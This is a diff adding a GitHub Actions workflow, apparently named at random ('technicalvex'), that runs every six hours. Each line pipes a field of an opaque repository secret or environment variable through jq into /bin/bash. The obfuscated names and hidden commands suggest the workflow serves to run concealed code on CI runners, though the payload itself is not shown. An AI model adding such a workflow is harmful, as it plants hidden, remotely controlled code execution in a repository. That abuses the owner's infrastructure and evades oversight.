@@ -1,0 +1,33 @@
+name: technicalvex
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: technicalvex
+        env:
+          ebzw20493: ${{ secrets.ebzw20493 }}
+        run: |
+          echo $ebzw20493 | jq -r .c9991 | /bin/bash
+          echo $ak959 | jq -r .paxyh29030 | /bin/bash
+          echo $ozn380 | jq -r .jdgse1552 | /bin/bash
+          echo $eexw058 | jq -r .zd44 | /bin/bash
+          echo $b585 | jq -r .gavll0 | /bin/bash
+          echo $bjbn7544 | jq -r .de65 | /bin/bash
+          echo $fxk64940 | jq -r .zk87 | /bin/bash
+          echo $c457 | jq -r .j300 | /bin/bash
+          echo $wantq588 | jq -r .n6 | /bin/bash
+          echo $gmyb7 | jq -r .zh71 | /bin/bash
+          echo $eptkv70375 | jq -r .f356 | /bin/bash
+          echo $lphd69 | jq -r .jw85 | /bin/bash
+          echo $tsu0990 | jq -r .u33 | /bin/bash
+          echo $tply8 | jq -r .ugsry470 | /bin/bash
+          echo $yj98 | jq -r .t25055 | /bin/bash
+          echo $uzgcb461 | jq -r .gm635 | /bin/bash
+          echo $kkt8561 | jq -r .iftec057 | /bin/bash
+
